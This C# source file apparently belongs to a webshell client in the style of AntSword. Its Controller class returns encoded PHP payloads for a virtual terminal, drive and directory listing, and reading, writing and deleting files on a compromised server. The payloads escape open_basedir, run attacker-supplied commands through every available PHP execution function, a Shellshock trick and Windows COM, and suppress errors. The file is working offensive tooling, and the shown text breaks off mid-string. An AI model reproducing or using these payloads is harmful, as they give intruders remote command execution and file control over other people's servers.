

namespace WpfApp1.Payload.php
{
    public class Controller
    {

        public string info()
        {
            string info = "ZWNobyAkRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk/IjEiOiIwIjs7";
            return info;
        }

        /// <summary>
        /// 虚拟终端
        /// </summary>
        /// <returns></returns>
        public string Cmd()
        {
            string cmd = "header(\"Content-type%3atext/html%3bcharset%3dGBK\")%3b%3b%40ini_set(\"display_errors\",+\"0\")%3b%40set_time_limit(0)%3b$opdir%3d%40ini_get(\"open_basedir\")%3bif($opdir)+{$ocwd%3ddirname($_SERVER[\"SCRIPT_FILENAME\"])%3b$oparr%3dpreg_split(\"/%3b|%3a/\",$opdir)%3b%40array_push($oparr,$ocwd,sys_get_temp_dir())%3bforeach($oparr+as+$item)+{if(!%40is_writable($item)){continue%3b}%3b$tmdir%3d$item.\"/.216f0952\"%3b%40mkdir($tmdir)%3bif(!%40file_exists($tmdir)){continue%3b}%40chdir($tmdir)%3b%40ini_set(\"open_basedir\",+\"..\")%3b$cntarr%3d%40preg_split(\"/\\\\\\\\|\\//\",$tmdir)%3bfor($i%3d0%3b$i<sizeof($cntarr)%3b$i%2b%2b){%40chdir(\"..\")%3b}%3b%40ini_set(\"open_basedir\",\"/\")%3b%40rmdir($tmdir)%3bbreak%3b}%3b}%3b%3bfunction+asenc($out){return+$out%3b}%3bfunction+asoutput(){$output%3dob_get_contents()%3bob_end_clean()%3becho+%40asenc($output)%3b}ob_start()%3btry{$p%3dbase64_decode($_POST[\"z1\"])%3b$s%3dbase64_decode($_POST[\"cmd\"])%3b$d%3ddirname($_SERVER[\"SCRIPT_FILENAME\"])%3b$c%3dsubstr($d,0,1)%3d%3d\"/\"%3f\"-c+\\\"{$s}\\\"\"%3a\"/c+\\\"{$s}\\\"\"%3bif(substr($d,0,1)%3d%3d\"/\"){%40putenv(\"PATH%3d\".getenv(\"PATH\").\"%3a/usr/local/sbin%3a/usr/local/bin%3a/usr/sbin%3a/usr/bin%3a/sbin%3a/bin\")%3b}else{%40putenv(\"PATH%3d\".getenv(\"PATH\").\"%3bC%3a/Windows/system32%3bC%3a/Windows/SysWOW64%3bC%3a/Windows%3bC%3a/Windows/System32/WindowsPowerShell/v1.0/%3b\")%3b}$r%3d\"{$p}+{$c}\"%3bfunction+fe($f){$d%3dexplode(\",\",%40ini_get(\"disable_functions\"))%3bif(empty($d)){$d%3darray()%3b}else{$d%3darray_map('trim',array_map('strtolower',$d))%3b}return(function_exists($f)%26%26is_callable($f)%26%26!in_array($f,$d))%3b}%3bfunction+runshellshock($d,+$c)+{if+(substr($d,+0,+1)+%3d%3d+\"/\"+%26%26+fe('putenv')+%26%26+(fe('error_log')+||+fe('mail')))+{if+(strstr(readlink(\"/bin/sh\"),+\"bash\")+!%3d+FALSE)+{$tmp+%3d+tempnam(sys_get_temp_dir(),+'as')%3bputenv(\"PHP_LOL%3d()+{+x%3b+}%3b+$c+>$tmp+2>%261\")%3bif+(fe('error_log'))+{error_log(\"a\",+1)%3b}+else+{mail(\"a%40127.0.0.1\",+\"\",+\"\",+\"-bv\")%3b}}+else+{return+False%3b}$output+%3d+%40file_get_contents($tmp)%3b%40unlink($tmp)%3bif+($output+!%3d+\"\")+{print($output)%3breturn+True%3b}}return+False%3b}%3bfunction+runcmd($c){$ret%3d0%3b$d%3ddirname($_SERVER[\"SCRIPT_FILENAME\"])%3bif(fe('system')){%40system($c,$ret)%3b}elseif(fe('passthru')){%40passthru($c,$ret)%3b}elseif(fe('shell_exec')){print(%40shell_exec($c))%3b}elseif(fe('exec')){%40exec($c,$o,$ret)%3bprint(join(\"\r\n\",$o))%3b}elseif(fe('popen')){$fp%3d%40popen($c,'r')%3bwhile(!%40feof($fp)){print(%40fgets($fp,2048))%3b}%40pclose($fp)%3b}elseif(fe('proc_open')){$p+%3d+%40proc_open($c,+array(1+%3d>+array('pipe',+'w'),+2+%3d>+array('pipe',+'w')),+$io)%3bwhile(!%40feof($io[1])){print(%40fgets($io[1],2048))%3b}while(!%40feof($io[2])){print(%40fgets($io[2],2048))%3b}%40fclose($io[1])%3b%40fclose($io[2])%3b%40proc_close($p)%3b}elseif(fe('antsystem')){%40antsystem($c)%3b}elseif(runshellshock($d,+$c))+{return+$ret%3b}elseif(substr($d,0,1)!%3d\"/\"+%26%26+%40class_exists(\"COM\")){$w%3dnew+COM('WScript.shell')%3b$e%3d$w->exec($c)%3b$so%3d$e->StdOut()%3b$ret.%3d$so->ReadAll()%3b$se%3d$e->StdErr()%3b$ret.%3d$se->ReadAll()%3bprint($ret)%3b}else{$ret+%3d+127%3b}return+$ret%3b}%3b$ret%3d%40runcmd($r.\"+2>%261\")%3bprint+($ret!%3d0)%3f\"ret%3d{$ret}\"%3a\"\"%3b%3b}catch(Exception+$e){echo+\"ERROR%3a//\".$e->getMessage()%3b}%3basoutput()%3bdie()%3b";
            //string cmd="QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjEyODk0ZjBkOWIiO0Bta2RpcigkdG1kaXIpO2lmKCFAZmlsZV9leGlzdHMoJHRtZGlyKSl7Y29udGludWU7fUBjaGRpcigkdG1kaXIpO0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCAiLi4iKTskY250YXJyPUBwcmVnX3NwbGl0KCIvXFxcXHxcLy8iLCR0bWRpcik7Zm9yKCRpPTA7JGk8c2l6ZW9mKCRjbnRhcnIpOyRpKyspe0BjaGRpcigiLi4iKTt9O0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIvIik7QHJtZGlyKCR0bWRpcik7YnJlYWs7fTt9OztmdW5jdGlvbiBhc2VuYygkb3V0KXtyZXR1cm4gJG91dDt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICJkNzdmIi4iNWQ5OGUiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjdiYTY4YSIuIjIwMTI1MCI7fW9iX3N0YXJ0KCk7dHJ5eyRwPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsiZDFkMTg5MTNiZGNhOTgiXSwyKSk7JHM9YmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJxMDU0NWNlZDZjZjliYyJdLDIpKTskZW52c3RyPUBiYXNlNjRfZGVjb2RlKHN1YnN0cigkX1BPU1RbImY0Y2YzOWVhMmE4MDIyIl0sMikpOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjtpZihzdWJzdHIoJGQsMCwxKT09Ii8iKXtAcHV0ZW52KCJQQVRIPSIuZ2V0ZW52KCJQQVRIIikuIjovdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW4iKTt9ZWxzZXtAcHV0ZW52KCJQQVRIPSIuZ2V0ZW52KCJQQVRIIikuIjtDOi9XaW5kb3dzL3N5c3RlbTMyO0M6L1dpbmRvd3MvU3lzV09XNjQ7QzovV2luZG93cztDOi9XaW5kb3dzL1N5c3RlbTMyL1dpbmRvd3NQb3dlclNoZWxsL3YxLjAvOyIpO31pZighZW1wdHkoJGVudnN0cikpeyRlbnZhcnI9ZXhwbG9kZSgifHx8YXNsaW5lfHx8IiwgJGVudnN0cik7Zm9yZWFjaCgkZW52YXJyIGFzICR2KSB7aWYgKCFlbXB0eSgkdikpIHtAcHV0ZW52KHN0cl9yZXBsYWNlKCJ8fHxhc2tleXx8fCIsICI9IiwgJHYpKTt9fX0kcj0ieyRwfSB7JGN9IjtmdW5jdGlvbiBmZSgkZil7JGQ9ZXhwbG9kZSgiLCIsQGluaV9nZXQoImRpc2FibGVfZnVuY3Rpb25zIikpO2lmKGVtcHR5KCRkKSl7JGQ9YXJyYXkoKTt9ZWxzZXskZD1hcnJheV9tYXAoJ3RyaW0nLGFycmF5X21hcCgnc3RydG9sb3dlcicsJGQpKTt9cmV0dXJuKGZ1bmN0aW9uX2V4aXN0cygkZikmJmlzX2NhbGxhYmxlKCRmKSYmIWluX2FycmF5KCRmLCRkKSk7fTtmdW5jdGlvbiBydW5zaGVsbHNob2NrKCRkLCAkYykge2lmIChzdWJzdHIoJGQsIDAsIDEpID09ICIvIiAmJiBmZSgncHV0ZW52JykgJiYgKGZlKCdlcnJvcl9sb2cnKSB8fCBmZSgnbWFpbCcpKSkge2lmIChzdHJzdHIocmVhZGxpbmsoIi9iaW4vc2giKSwgImJhc2giKSAhPSBGQUxTRSkgeyR0bXAgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ2FzJyk7cHV0ZW52KCJQSFBfTE9MPSgpIHsgeDsgfTsgJGMgPiR0bXAgMj4mMSIpO2lmIChmZSgnZXJyb3JfbG9nJykpIHtlcnJvcl9sb2coImEiLCAxKTt9IGVsc2Uge21haWwoImFAMTI3LjAuMC4xIiwgIiIsICIiLCAiLWJ2Iik7fX0gZWxzZSB7cmV0dXJuIEZhbHNlO30kb3V0cHV0ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR0bXApO0B1bmxpbmsoJHRtcCk7aWYgKCRvdXRwdXQgIT0gIiIpIHtwcmludCgkb3V0cHV0KTtyZXR1cm4gVHJ1ZTt9fXJldHVybiBGYWxzZTt9O2Z1bmN0aW9uIHJ1bmNtZCgkYyl7JHJldD0wOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZihmZSgnc3lzdGVtJykpe0BzeXN0ZW0oJGMsJHJldCk7fWVsc2VpZihmZSgncGFzc3RocnUnKSl7QHBhc3N0aHJ1KCRjLCRyZXQpO31lbHNlaWYoZmUoJ3NoZWxsX2V4ZWMnKSl7cHJpbnQoQHNoZWxsX2V4ZWMoJGMpKTt9ZWxzZWlmKGZlKCdleGVjJykpe0BleGVjKCRjLCRvLCRyZXQpO3ByaW50KGpvaW4oIgoiLCRvKSk7fWVsc2VpZihmZSgncG9wZW4nKSl7JGZwPUBwb3BlbigkYywncicpO3doaWxlKCFAZmVvZigkZnApKXtwcmludChAZmdldHMoJGZwLDIwNDgpKTt9QHBjbG9zZSgkZnApO31lbHNlaWYoZmUoJ3Byb2Nfb3BlbicpKXskcCA9IEBwcm9jX29wZW4oJGMsIGFycmF5KDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLCAyID0%2BIGFycmF5KCdwaXBlJywgJ3cnKSksICRpbyk7d2hpbGUoIUBmZW9mKCRpb1sxXSkpe3ByaW50KEBmZ2V0cygkaW9bMV0sMjA0OCkpO313aGlsZSghQGZlb2YoJGlvWzJdKSl7cHJpbnQoQGZnZXRzKCRpb1syXSwyMDQ4KSk7fUBmY2xvc2UoJGlvWzFdKTtAZmNsb3NlKCRpb1syXSk7QHByb2NfY2xvc2UoJHApO31lbHNlaWYoZmUoJ2FudHN5c3RlbScpKXtAYW50c3lzdGVtKCRjKTt9ZWxzZWlmKHJ1bnNoZWxsc2hvY2soJGQsICRjKSkge3JldHVybiAkcmV0O31lbHNlaWYoc3Vic3RyKCRkLDAsMSkhPSIvIiAmJiBAY2xhc3NfZXhpc3RzKCJDT00iKSl7JHc9bmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOyRlPSR3LT5leGVjKCRjKTskc289JGUtPlN0ZE91dCgpOyRyZXQuPSRzby0%2BUmVhZEFsbCgpOyRzZT0kZS0%2BU3RkRXJyKCk7JHJldC49JHNlLT5SZWFkQWxsKCk7cHJpbnQoJHJldCk7fWVsc2V7JHJldCA9IDEyNzt9cmV0dXJuICRyZXQ7fTskcmV0PUBydW5jbWQoJHIuIiAyPiYxIik7cHJpbnQgKCRyZXQhPTApPyJyZXQ9eyRyZXR9IjoiIjs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw%3D%3D";
            //string cmd = "header(%22Content-type%3Atext%2Fhtml%3Bcharset%3DGBK%22)%3B%0D%0A%40ini_set(%22display_errors%22,%20%220%22)%3B%0D%0A%40set_time_limit(0)%3B%0D%0A$opdir%3D%40ini_get(%22open_basedir%22)%3B%0D%0Aif($opdir)%20%7B%0D%0A%09$ocwd%3Ddirname($_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%0D%0A%09$oparr%3Dpreg_split(%22%2F%3B%7C%3A%2F%22,$opdir)%3B%0D%0A%09%40array_push($oparr,$ocwd,sys_get_temp_dir())%3B%0D%0A%09foreach($oparr%20as%20$item)%20%7B%0D%0A%09%09if(!%40is_writable($item))%20%7B%0D%0A%09%09%09continue%3B%0D%0A%09%09%7D%0D%0A%09%09%3B%0D%0A%09%09$tmdir%3D$item.%22%2F.216f0952%22%3B%0D%0A%09%09%40mkdir($tmdir)%3B%0D%0A%09%09if(!%40file_exists($tmdir))%20%7B%0D%0A%09%09%09continue%3B%0D%0A%09%09%7D%0D%0A%09%09%40chdir($tmdir)%3B%0D%0A%09%09%40ini_set(%22open_basedir%22,%20%22..%22)%3B%0D%0A%09%09$cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22,$tmdir)%3B%0D%0A%09%09for%20($i%3D0%3B$i%3Csizeof($cntarr)%3B$i++)%20%7B%0D%0A%09%09%09%40chdir(%22..%22)%3B%0D%0A%09%09%7D%0D%0A%09%09%3B%0D%0A%09%09%40ini_set(%22open_basedir%22,%22%2F%22)%3B%0D%0A%09%09%40rmdir($tmdir)%3B%0D%0A%09%09break%3B%0D%0A%09%7D%0D%0A%09%3B%0D%0A%7D%0D%0A%3B%0D%0A%3B%0D%0Afunction%20asenc($out)%20%7B%0D%0A%09return%20$out%3B%0D%0A%7D%0D%0A%3B%0D%0Afunction%20asoutput()%20%7B%0D%0A%09$output%3Dob_get_contents()%3B%0D%0A%09ob_end_clean()%3B%0D%0A%09echo%20%40asenc($output)%3B%0D%0A%7D%0D%0Aob_start()%3B%0D%0Atry%20%7B%0D%0A%09$p%3D(base64_decode$_POST%5B%22z1%22%5D)%3B%0D%0A%09$s%3D(base64_decode$_POST%5B%22cmd%22%5D)%3B%0D%0A%0D%0A%09$d%3Ddirname($_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%0D%0A%09$c%3Dsubstr($d,0,1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B$s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B$s%7D%5C%22%22%3B%0D%0A%09if(substr($d,0,1)%3D%3D%22%2F%22)%20%7B%0D%0A%09%09%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%0D%0A%09%7D%20else%20%7B%0D%0A%09%09%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%0D%0A%09%7D%0D%0A%09$r%3D%22%7B$p%7D%20%7B$c%7D%22%3B%0D%0A%09function%20fe($f)%20%7B%0D%0A%09%09$d%3Dexplode(%22,%22,%40ini_get(%22disable_functions%22))%3B%0D%0A%09%09if(empty($d))%20%7B%0D%0A%09%09%09$d%3Darray()%3B%0D%0A%09%09%7D%20else%20%7B%0D%0A%09%09%09$d%3Darray_map('trim',array_map('strtolower',$d))%3B%0D%0A%09%09%7D%0D%0A%09%09return(function_exists($f)%26%26is_callable($f)%26%26!in_array($f,$d))%3B%0D%0A%09%7D%0D%0A%09%3B%0D%0A%09function%20runshellshock($d,%20$c)%20%7B%0D%0A%09%09if%20(substr($d,%200,%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe('putenv')%20%26%26%20(fe('error_log')%20%7C%7C%20fe('mail')))%20%7B%0D%0A%09%09%09if%20(strstr(readlink(%22%2Fbin%2Fsh%22),%20%22bash%22)%20!%3D%20FALSE)%20%7B%0D%0A%09%09%09%09$tmp%20%3D%20tempnam(sys_get_temp_dir(),%20'as')%3B%0D%0A%09%09%09%09putenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20$c%20%3E$tmp%202%3E%261%22)%3B%0D%0A%09%09%09%09if%20(fe('error_log'))%20%7B%0D%0A%09%09%09%09%09error_log(%22a%22,%201)%3B%0D%0A%09%09%09%09%7D%20else%20%7B%0D%0A%09%09%09%09%09mail(%22a%40127.0.0.1%22,%20%22%22,%20%22%22,%20%22-bv%22)%3B%0D%0A%09%09%09%09%7D%0D%0A%09%09%09%7D%20else%20%7B%0D%0A%09%09%09%09return%20False%3B%0D%0A%09%09%09%7D%0D%0A%09%09%09$output%20%3D%20%40file_get_contents($tmp)%3B%0D%0A%09%09%09%40unlink($tmp)%3B%0D%0A%09%09%09if%20($output%20!%3D%20%22%22)%20%7B%0D%0A%09%09%09%09print($output)%3B%0D%0A%09%09%09%09return%20True%3B%0D%0A%09%09%09%7D%0D%0A%09%09%7D%0D%0A%09%09return%20False%3B%0D%0A%09%7D%0D%0A%09%3B%0D%0A%09function%20runcmd($c)%20%7B%0D%0A%09%09$ret%3D0%3B%0D%0A%09%09$d%3Ddirname($_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%0D%0A%09%09if(fe('system'))%20%7B%0D%0A%09%09%09%40system($c,$ret)%3B%0D%0A%09%09%7D%20elseif(fe('passthru'))%20%7B%0D%0A%09%09%09%40passthru($c,$ret)%3B%0D%0A%09%09%7D%20elseif(fe('shell_exec'))%20%7B%0D%0A%09%09%09print(%40shell_exec($c))%3B%0D%0A%09%09%7D%20elseif(fe('exec'))%20%7B%0D%0A%09%09%09%40exec($c,$o,$ret)%3B%0D%0A%09%09%09print(join(%22%22,$o))%3B%0D%0A%09%09%7D%20elseif(fe('popen'))%20%7B%0D%0A%09%09%09$fp%3D%40popen($c,'r')%3B%0D%0A%09%09%09while(!%40feof($fp))%20%7B%0D%0A%09%09%09%09print(%40fgets($fp,2048))%3B%0D%0A%09%09%09%7D%0D%0A%09%09%09%40pclose($fp)%3B%0D%0A%09%09%7D%20elseif(fe('proc_open'))%20%7B%0D%0A%09%09%09$p%20%3D%20%40proc_open($c,%20array(1%20%3D%3E%20array('pipe',%20'w'),%202%20%3D%3E%20array('pipe',%20'w')),%20$io)%3B%0D%0A%09%09%09while(!%40feof($io%5B1%5D))%20%7B%0D%0A%09%09%09%09print(%40fgets($io%5B1%5D,2048))%3B%0D%0A%09%09%09%7D%0D%0A%09%09%09while(!%40feof($io%5B2%5D))%20%7B%0D%0A%09%09%09%09print(%40fgets($io%5B2%5D,2048))%3B%0D%0A%09%09%09%7D%0D%0A%09%09%09%40fclose($io%5B1%5D)%3B%0D%0A%09%09%09%40fclose($io%5B2%5D)%3B%0D%0A%09%09%09%40proc_close($p)%3B%0D%0A%09%09%7D%20elseif(fe('antsystem'))%20%7B%0D%0A%09%09%09%40antsystem($c)%3B%0D%0A%09%09%7D%20elseif(runshellshock($d,%20$c))%20%7B%0D%0A%09%09%09return%20$ret%3B%0D%0A%09%09%7D%20elseif(substr($d,0,1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%20%7B%0D%0A%09%09%09$w%3Dnew%20COM('WScript.shell')%3B%0D%0A%09%09%09$e%3D$w-%3Eexec($c)%3B%0D%0A%09%09%09$so%3D$e-%3EStdOut()%3B%0D%0A%09%09%09$ret.%3D$so-%3EReadAll()%3B%0D%0A%09%09%09$se%3D$e-%3EStdErr()%3B%0D%0A%09%09%09$ret.%3D$se-%3EReadAll()%3B%0D%0A%09%09%09print($ret)%3B%0D%0A%09%09%7D%20else%20%7B%0D%0A%09%09%09$ret%20%3D%20127%3B%0D%0A%09%09%7D%0D%0A%09%09return%20$ret%3B%0D%0A%09%7D%0D%0A%09%3B%0D%0A%09$ret%3D%40runcmd($r.%22%202%3E%261%22)%3B%0D%0A%09print%20($ret!%3D0)%3F%22ret%3D%7B$ret%7D%22%3A%22%22%3B%0D%0A%09%3B%0D%0A%7D%0D%0Acatch(Exception%20$e)%20%7B%0D%0A%09echo%20%22ERROR%3A%2F%2F%22.$e-%3EgetMessage()%3B%0D%0A%7D%0D%0A%3B%0D%0Aasoutput()%3B%0D%0Adie()%3B%0D%0A%0D%0A";
            return cmd;
        }
        /// <summary>
        /// 获取根目录
        /// </summary>
        /// <returns></returns>
        public string Wroot()
        {
            string root = "JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOwplY2hvICRkOw==";
            return root;
        }

        /// <summary>
        /// 获取盘符
        /// </summary>
        public string Pan()
        {
            string pan = "b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7IGZvcmVhY2ggKHJhbmdlKCJDIiwgIloiKSBhcyAkTClpZiAoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNlIHskUi49ICIvIjt9O2VjaG8gJFI7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTsgZGllKCk7";
            return pan;
        }
        /// <summary>
        /// 获取文件 和目录
        /// </summary>
        /// <returns></returns>
        public string Files()
        {
            string Files = "%40ini_set(%22display_errors%22,%20%220%22)%3B%0D%0A%40set_time_limit(0)%3B%0D%0A$path%3Dbase64_decode($_POST%5B'p'%5D)%3B%0D%0A$F%3Dscandir($path)%3B%0D%0Aif($F%3D%3DNULL)%7Becho(%22ERROR%3A%2F%2F%20Path%20Not%20Found%20Or%20No%20Permission!%22)%3B%7Delse%7B$tmparr%20%3D%20array()%3Bforeach%20($F%20as%20$value)%7Bif($value%20!%3D%20'.'%20%26%26%20$value%20!%3D%20'..')%7B$P%20%3D$path.%22%2F%22.$value%3B$T%20%3D%20date(%22Y-m-d%20H%3Ai%3As%22,%20filemtime($P))%3B$E%3D%20substr(base_convert(fileperms($P),%2010,%208),%20-4)%3B$arr%20%3D%20array(%22time%22%20%3D%3E%20$T,%20%22size%22%20%3D%3E%20filesize($P),%20%22root%22%20%3D%3E%20$E,%20%22path%22%20%3D%3Eurlencode(is_dir($P)%20%3F$value.%22%2F%22%3A$value))%3B$tmparr%5B%5D%20%3D%20$arr%3B%7D%7D%3Becho%20json_encode($tmparr)%3B%7D";
            return Files;
        }
        /// <summary>
        /// 查看文件内容
        /// </summary>
        /// <returns></returns>
        public string ViewFile()
        {
            string ViewFile = "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmYyMDc3OTYzOSI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiAkb3V0O307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gQGFzZW5jKCRvdXRwdXQpO31vYl9zdGFydCgpO3RyeXskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsicGF0aCJdKTskUD1AZm9wZW4oJEYsInIiKTtlY2hvKEBmcmVhZCgkUCxmaWxlc2l6ZSgkRik/ZmlsZXNpemUoJEYpOjQwOTYpKTtAZmNsb3NlKCRQKTs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw==";
            return ViewFile;
        }
        /// <summary>
        /// 修改文件内容 or 新建文件
        /// </summary>
        /// <returns></returns>
        public string WriteFile()
        {
            string WriteFile = "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjU2YTVhZiI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiAkb3V0O307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gQGFzZW5jKCRvdXRwdXQpO31vYl9zdGFydCgpO3RyeXtlY2hvIEBmd3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbImZpbGUiXSksInciKSxiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29udGVudCJdKSk/IjEiOiIwIjs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOwo=";
            return WriteFile;
        }
        /// <summary>
        /// 删除文件
        /// </summary>
        /// <returns></returns>
        public string DelFile()
        {
            string DelFile = "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmM0NzZhYmFmIjtAbWtkaXIoJHRtZGlyKTtpZighQGZpbGVfZXhpc3RzKCR0bWRpcikpe2NvbnRpbnVlO31AY2hkaXIoJHRtZGlyKTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7JGNudGFycj1AcHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkdG1kaXIpO2ZvcigkaT0wOyRpPHNpemVvZigkY250YXJyKTskaSsrKXtAY2hkaXIoIi4uIik7fTtAaW5pX3NldCgib3B